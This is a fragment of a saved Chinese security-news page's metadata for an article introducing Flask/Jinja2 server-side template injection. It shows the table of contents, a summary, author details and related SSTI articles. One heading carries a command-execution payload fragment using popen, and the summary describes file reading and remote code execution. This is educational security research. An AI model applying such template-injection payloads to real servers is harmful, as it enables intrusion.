e.g.","id":"#h3-5"},{"title":"Flask中的路由","id":"#h3-6"},{"title":"main入口","id":"#h3-7"}]},{"title":"Jinja2渲染模板","id":"#h2-8","sub":[{"title":"简介","id":"#h3-9"},{"title":"基本语法","id":"#h3-10"},{"title":"存在漏洞的Demo","id":"#h3-11"},{"title":"不存在漏洞的Demo","id":"#h3-12"}]},{"title":"SSTI思路","id":"#h2-13","sub":[{"title":"内置类属性和方法","id":"#h3-14"},{"title":"利用思路","id":"#h3-15"}]},{"title":"STTI利用","id":"#h2-16","sub":[{"title":"测试代码","id":"#h3-17"},{"title":"0x01 __bultins__","id":"#h3-18"},{"title":"<a name=\"0x02 ['popen'](\"command\").read()\" class=\"reference-link\">0x02 ['popen'](\"command\").read()","id":"#h3-19"},{"title":"0x03 直接调用 __import__()","id":"#h3-20"},{"title":"0x04 利用循环构造payload","id":"#h3-21"}]},{"title":"小结","id":"#h2-22","sub":[]},{"title":"参考文章","id":"#h2-23","sub":[]}],"success":true},"share":{"title":"初探 Python Flask+Jinja2 SSTI","desc":"SSTI主要是因为某些语言的框架中使用了渲染函数，比如Python中的Flask框架用jinjia2模块内的渲染函数，在不规范的代码中，导致用户可以控制变量并构造恶意的表达式，比如{{98-2}}，恶意的表达式未经严格的过滤直接带入模板中渲染执行使得攻击者可以读取文件，远程代码执行等等。","imgUrl":"https://p3.ssl.qhimg.com/sdm/160_160_100/t0105c011a6c7e9e987.jpg"},"author":{"nickname":"Zh1z3ven","user_url":"","id":155804,"avatar":"https://thirdwx.qlogo.cn/mmopen/vi_32/vRwu3zzRPhiaer28hCoOic0icQvbQOwPjM5cdicAOaYeg6hOzvzGLyDbJMWjBA3CrmmeZuicbicySTlBC3VP6zhrgt6w/132","banner":"https://p3.ssl.qhimg.com/t014757b72460d855bf.png","location":"","user_label":"","description":"这个人太懒了，签名都懒得写一个","register_date":"2020-12-13 23:39:11","self":false,"follow":false,"post_count":4,"follower_count":1,"follow_count":3,"comment_count":4},"relevant":[{"id":260335,"title":"Latte-SSTI-Payloads总结","date":"2021-12-13 16:30:02"},{"id":254519,"title":"Java安全之Thymeleaf SSTI分析","date":"2021-11-02 16:30:03"},{"id":246293,"title":"梨子带你刷burpsuite靶场系列之高级漏洞篇 - 服务器端模板注入(SSTI)专题","date":"2021-08-28 10:00:20"},{"id":246094,"title":"SSTI漏洞学习（下）——Flask/Jinja模板引擎的相关绕过","date":"2021-08-03 10:00:06"},{"id":246093,"title":"SSTI漏洞学习 (上)——基础知识和一些不常见的模板引擎介绍","date":"2021-07-30 15:30:35"},{"id":228176,"title":"浅析Python SSTI/沙盒逃逸","date":"2021-01-29 14:30:10"},{"id":226544,"title":"详解模板注入漏洞（上）","date":"2020-12-29 15:30:23"}],"authorPostList":[{"post_id":254519,"title":"Java安全之Thymeleaf SSTI分析","cover":"https://p2.ssl.qhimg.com/sdm/229_160_100/t0151026bb01b96e351.jpg","date":"2021-11-02 16:30:03"},{"post_id":248004,"title":"Java安全之ysoserial-URLDNS链分析","cover":"https://p0.ssl.qhimg.com/sdm/229_160_100/t01b39c829513cf63fa.jpg","date":"2021-08-30 17:30:21"},{"post_id":226900,"title":"初探 Python Flask+Jinja2 SSTI","cover":"https://p3.ssl.qhimg.com/sdm/229_160_100/t0105c011a6c7e9e987.jpg","date":"2021-01-12 16:30:55"},{"post_id":225451,"title":"Supervisord远程命令执行漏洞复现（CVE-2017-11610）","cover":"https://p2.ssl.qhimg.com/sdm/229_160_100/t015fb01bfa08a8412c.jpg","date":"2020-12-22 14:30:30"}],"cookie":{"__guid":"213549842.2010739486156183000.1685757824050.7908","__DC_gid":"213549842.902862346.1685757824050.1687257211098.16"}}};
+//published at: 6/23/2023, 3:34:36 PM</script>
+
+<script src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/a89b1e55fab19834,969b9d2ab6d58ff9.js.下载"></script>
+<script src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/e855bc476c0070c4,d70645fabcfd28e5,b00f894d26352cfe,374cd4f654903275,1fbf0cc911f15a9c.js.下载"></script>
+<script src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/43c736269a19e5f8,d7c4492c306d9e12.js.下载"></script>
+<script src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/c3f64e723fc684b2,d29a864a4b5dd4b6,5c4b8b1bbe75533d,f59329488ebbc180,569b6657398e046f,50a9d6f78d7b9c2b,ffa01aa1dfa9875c,1e0c54ddfbe618cb,cc52ec6e18fb5e0f,7e2ef3c63800d75a,163f062eddf12afb,12d46f.下载"></script><div id="js-toast" data-v-app=""></div><!----><div id="js-lift" data-v-app=""></div><div class="_15"></div>
+
+
+</body></html>
